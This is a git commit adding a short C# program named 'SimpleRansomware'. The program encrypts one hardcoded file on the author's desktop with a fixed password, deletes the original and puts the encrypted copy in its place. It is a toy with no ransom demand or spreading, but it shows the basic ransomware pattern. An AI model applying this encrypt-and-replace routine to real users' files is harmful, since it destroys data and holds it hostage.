8c88870c9a4414492f7c1d35c5659fc0ea8a7103
vitormluz <vitormdluzz2003@outlook.com>
2023-08-12 15:41:27 -0300

    commit

---
+++ Program.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using SharpAESCrypt;
+
+namespace SimpleRansomware
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string dir = @"C:\Users\vitor\OneDrive\Área de Trabalho\";
+            string text_file = dir + "File.txt.txt";
+            string encrypted = dir + "encrypted.txt";
+            string key = "key";
+
+            SharpAESCrypt.SharpAESCrypt.Encrypt(key, text_file, encrypted);
+            File.Delete(text_file);
+            File.Move(encrypted, text_file);
+        }
+    }
+}
